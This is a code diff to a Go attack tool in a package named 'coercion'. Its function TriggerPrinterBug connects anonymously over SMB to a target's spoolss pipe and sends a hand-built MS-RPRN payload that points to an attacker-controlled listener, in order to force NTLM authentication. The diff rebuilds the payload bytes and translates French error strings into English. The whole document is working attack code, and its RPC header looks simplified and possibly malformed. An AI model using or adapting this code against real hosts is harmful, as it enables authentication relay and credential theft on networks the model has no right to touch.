@@ -2,7 +2,8 @@
 package coercion
 
 import (
-	"encoding/hex"
+	"bytes"
+	"encoding/binary"
 	"fmt"
 	"log"
 	"net"
@@ -12,54 +13,57 @@ import (
 
 // TriggerPrinterBug déclenche une coercion NTLM via MS-RPRN (PrinterBug)
 func TriggerPrinterBug(target, listener string) error {
-	// Connexion TCP + SMB anonyme (comme PetitPotam)
 	tcpConn, err := net.Dial("tcp", target+":445")
 	if err != nil {
-		return fmt.Errorf("connexion TCP échouée : %w", err)
+		return fmt.Errorf("TCP connection failed : %w", err)
 	}
 	defer tcpConn.Close()
 
 	d := &smb2.Dialer{
-		Initiator: &smb2.NTLMInitiator{
-			User:     "",
-			Password: "",
-		},
+		Initiator: &smb2.NTLMInitiator{User: "", Password: ""},
 	}
 	session, err := d.Dial(tcpConn)
 	if err != nil {
-		return fmt.Errorf("dial SMB échoué : %w", err)
+		return fmt.Errorf("dial SMB failed : %w", err)
 	}
 	defer session.Logoff()
 
-	// Monter IPC$
 	fs, err := session.Mount("IPC$")
 	if err != nil {
-		return fmt.Errorf("montage IPC$ échoué : %w", err)
+		return fmt.Errorf("IPC$ assembly failed : %w", err)
 	}
 	defer fs.Umount()
 
-	// Ouvrir pipe \pipe\spoolss
 	pipe, err := fs.Open(`\pipe\spoolss`)
 	if err != nil {
-		return fmt.Errorf("ouverture pipe spoolss échouée : %w", err)
+		return fmt.Errorf("pipe spool opening failed : %w", err)
 	}
 	defer pipe.Close()
 
-	// Payload PrinterBug (hex réel pour RpcRemoteFindFirstPrinterChangeNotificationEx opnum 65 ou 69)
+	// CORRECTION : construction propre du payload
 	uncPath := fmt.Sprintf(`\\%s\pipe\whatever`, listener)
 	uncBytes := utf16leEncode(uncPath + "\x00")
-	uncLen := len(uncBytes)
 
-	// Payload exemple (adapté de PrinterBug.py – bind + call)
-	hexPayload := "050000031000000018000000000000000000000000000000123456781234abcd" + "ef000123456789ab010000000000000000000000" + "41000000" + fmt.Sprintf("%08x", uncLen) + hex.EncodeToString(uncBytes) + "00000000" // Simplifié
+	var buf bytes.Buffer
+	// Header MS-RPRN (RpcRemoteFindFirstPrinterChangeNotificationEx)
+	rpcHeader := []byte{
+		0x05, 0x00,
+		0x0b, 0x03,
+		0x10, 0x00, 0x00, 0x00,
+		0x48, 0x00,
+		0x00, 0x00,
+		0x01, 0x00, 0x00, 0x00,
+	}
+	buf.Write(rpcHeader)
+	binary.Write(&buf, binary.LittleEndian, uint32(len(uncBytes)))
+	buf.Write(uncBytes)
 
-	payload, _ := hex.DecodeString(hexPayload)
-
+	payload := buf.Bytes()
 	n, err := pipe.Write(payload)
 	if err != nil {
-		return fmt.Errorf("échec envoi payload : %w", err)
+		return fmt.Errorf("Payload sending failed : %w", err)
 	}
 
-	log.Printf("[+] PrinterBug réussi : %d octets envoyés pour %s → %s", n, target, listener)
+	log.Printf("[+] PrinterBug : %d bytes sent (%s → %s)", n, target, listener)
 	return nil
 }
